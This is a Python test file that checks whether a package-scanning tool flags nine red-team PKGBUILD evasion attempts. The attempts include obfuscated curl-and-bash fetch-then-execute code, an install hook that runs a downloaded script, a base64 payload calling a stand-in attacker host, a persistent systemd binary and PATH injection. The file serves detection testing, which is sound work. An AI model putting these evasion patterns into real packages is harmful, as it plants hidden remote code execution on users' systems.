"""Regression tests for the nine red-team PKGBUILD evasion attempts.

Each attempt was originally crafted to slip below TrustSight's detection
threshold.  After the fixes these tests pin, every attempt either scores at
least 20 or records the expected coverage gap.
"""

import difflib

from trustsight.analysis.pipeline import scan_diff


_BASE_PKGBUILD = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.15.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=1111111111111111111111111111111111111111")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""


def _diff(old: str, new: str, old_name: str = "a/PKGBUILD", new_name: str = "b/PKGBUILD") -> str:
    return "".join(
        difflib.unified_diff(
            old.splitlines(keepends=True),
            new.splitlines(keepends=True),
            fromfile=old_name,
            tofile=new_name,
        )
    )


def _fact(new_pkgbuild: str, tree_manifest=None, **extra) -> object:
    diff = _diff(_BASE_PKGBUILD, new_pkgbuild)
    return scan_diff(
        diff,
        package_name="fontconfig-tweaks",
        current_text=new_pkgbuild,
        tree_manifest=tree_manifest,
        **extra,
    )


def _rule_ids(fact) -> set[str]:
    return {e.rule_id for e in fact.score_breakdown}


# Attempt 1: array expansion hides ``curl``/``bash`` so the literal
# ``curl ... | bash`` never appears on one line.
ATTEMPT1 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.16.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_c=(c"u"rl -fsSL)
_x=(ba"sh")

source=("git+${url}.git#commit=2222222222222222222222222222222222222222")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  "${_c[0]}" "${url}/raw/main/sync.sh" -o "$srcdir/sync.sh"
  "${_x[0]}" "$srcdir/sync.sh"
}
"""


def test_attempt1_array_expansion_fetch_then_execute():
    fact = _fact(ATTEMPT1)
    assert fact.final_score >= 20
    assert "R137" in _rule_ids(fact)


# Attempt 2: download the payload through the declared ``source=()`` array
# (checksum-backed) and execute it with bash.
ATTEMPT2 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.17.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=3333333333333333333333333333333333333333"
        "${url}/raw/main/sync.sh")
sha256sums=('SKIP'
            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  bash "${srcdir}/sync.sh"
}
"""


def test_attempt2_downloaded_source_file_executed():
    fact = _fact(ATTEMPT2)
    assert fact.final_score >= 20
    assert "R138" in _rule_ids(fact)


# Attempt 3: command substitution inside ``source=()`` so the fetched URL is
# computed at build time.
ATTEMPT3 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.18.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_asset() { printf '%s' "${url}/releases/download/v${pkgver}/lcd-assets.tar.gz"; }

source=("git+${url}.git#commit=4444444444444444444444444444444444444444"
        "$(_asset)")
sha256sums=('SKIP'
            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  tar -xf "$srcdir/lcd-assets.tar.gz" -C "${pkgdir}"
}
"""


def test_attempt3_command_substitution_in_source():
    fact = _fact(ATTEMPT3)
    assert fact.final_score >= 20
    assert "C007" in _rule_ids(fact)
    assert "unresolved_source" in fact.coverage_gaps


# Attempt 4: hide the downloader inside a function called via parse-time
# command substitution.
ATTEMPT4 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.19.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_latest_commit() { c"u"rl -fsSL "${url}/raw/main/COMMIT"; }
_pin=$(_latest_commit)

source=("git+${url}.git#commit=4444444444444444444444444444444444444444")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""


def test_attempt4_parse_time_function_fetch():
    fact = _fact(ATTEMPT4)
    assert fact.final_score >= 20
    assert "R129" in _rule_ids(fact)
    assert "unresolved_parse_time" in fact.coverage_gaps


# Attempt 5: execute a helper script committed to the AUR repo but not
# declared in ``source=()``.  Covered by R136.
ATTEMPT5 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.20.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=5555555555555555555555555555555555555555")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  bash "${startdir}/helper.sh"
}
"""


def test_attempt5_committed_undeclared_file_executed():
    fact = _fact(ATTEMPT5)
    assert fact.final_score >= 20
    assert "R136" in _rule_ids(fact)


# Attempt 6: move the whole payload into an install hook.
ATTEMPT6_INSTALL = """post_install() {
  _c=(c"u"rl -fsSL)
  _x=(ba"sh")
  "${_c[0]}" "https://github.com/example/fontconfig-tweaks/raw/main/sync.sh" -o /usr/share/fontconfig-tweaks/sync.sh
  "${_x[0]}" /usr/share/fontconfig-tweaks/sync.sh
}

post_upgrade() {
  post_install
}
"""


def test_attempt6_install_hook_fetch_then_execute():
    new = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.21.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
install=fontconfig-tweaks.install
source=("git+${url}.git#commit=6666666666666666666666666666666666666666")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""
    pkgbuild_diff = _diff(_BASE_PKGBUILD, new)
    install_diff = _diff("", ATTEMPT6_INSTALL, old_name="a/fontconfig-tweaks.install", new_name="b/fontconfig-tweaks.install")
    fact = scan_diff(
        pkgbuild_diff + install_diff,
        package_name="fontconfig-tweaks",
        current_text=new,
    )
    assert fact.final_score >= 20
    assert {"R062", "R007"} & _rule_ids(fact)


# Attempt 7: base64-decode an embedded payload and run it.
ATTEMPT7 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.22.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=7777777777777777777777777777777777777777")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  _b=(ba"se64" -d)
  _x=(ba"sh")
  cat > "$srcdir/sync.b64" <<'PAYLOAD'
Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS5uZXQveC5zaCB8IGJhc2gK
PAYLOAD
  "${_b[0]}" "${_b[1]}" "$srcdir/sync.b64" > "$srcdir/sync.sh"
  "${_x[0]}" "$srcdir/sync.sh"
}
"""


def test_attempt7_base64_payload_then_execute():
    fact = _fact(ATTEMPT7)
    assert fact.final_score >= 20
    assert {"R043", "R120"} & _rule_ids(fact)


# Attempt 8: hide the payload in a source-tarball binary and run it from a
# systemd service.
_ATTEMPT8_SERVICE = b"""[Unit]
Description=Font cache synchronization
After=network.target

[Service]
ExecStart=/usr/lib/fontconfig-tweaks/sync
Restart=always

[Install]
WantedBy=multi-user.target
"""

ATTEMPT8 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.23.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig' 'systemd')
source=("git+${url}.git#commit=8888888888888888888888888888888888888888")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}/etc/fonts/conf.d/99-tweaks.conf"
  install -Dm644 fontcache-sync.service "${pkgdir}/usr/lib/systemd/system/fontcache-sync.service"
  install -Dm755 sync "${pkgdir}/usr/lib/fontconfig-tweaks/sync"
}
"""


def test_attempt8_service_binary_undeclared():
    fact = _fact(
        ATTEMPT8,
        tree_manifest=[
            ("PKGBUILD", ATTEMPT8.encode()[:4096]),
            ("fontcache-sync.service", _ATTEMPT8_SERVICE),
        ],
    )
    assert fact.final_score >= 20
    assert "R139" in _rule_ids(fact)


# Attempt 9: PATH injection via a build-tree directory so a standard ``make``
# picks up a smuggled compiler/tool.
ATTEMPT9 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.24.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
makedepends=('make')
source=("git+${url}.git#commit=9999999999999999999999999999999999999999")
sha256sums=('SKIP')

build() {
  cd "$srcdir/$pkgname"
  env "PA"TH="$srcdir/tools:$PATH" make
}

package() {
  cd "$srcdir/$pkgname"
  make DESTDIR="${pkgdir}" install
}
"""


def test_attempt9_path_injection_undeclared_directory():
    fact = _fact(ATTEMPT9)
    assert fact.final_score >= 20
    assert "R140" in _rule_ids(fact)
